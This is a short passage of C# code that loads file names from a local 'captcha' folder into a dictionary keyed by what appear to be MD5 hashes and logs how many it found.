                Directory.CreateDirectory("captcha");
            }
            string[] filenames= Directory.GetFiles("captcha");
            for (int i = 0; i < filenames.Length; ++i)
            {
                int bi = filenames[i].LastIndexOf("\\") + 1;
                int ei = filenames[i].LastIndexOf(".");
                string md5 = filenames[i].Substring(bi, ei - bi);
                captcha.Add(md5, 1);
            }
            Global.logger.Debug("captcha :{0}", captcha.Count);
        }


    }
}
